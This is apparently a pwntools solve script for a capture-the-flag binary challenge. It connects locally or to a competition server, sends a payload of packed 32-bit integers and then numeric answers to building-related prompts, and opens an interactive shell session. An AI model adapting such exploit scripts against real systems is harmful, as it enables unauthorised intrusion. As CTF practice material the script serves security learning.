from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("tjc.tf", 31489)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


payload = p32(1) * 8
io.sendafter(" of your building: ", payload)
io.sendlineafter(" building (in acres): ", "1")
io.sendlineafter("(miles east of the city center)", "1")
io.sendlineafter("miles north of the city center)", "1")
io.sendlineafter("Enter the east-west coordinate: ", "1")
io.sendlineafter("Enter the north-south coordinate: ", "1")

io.interactive()
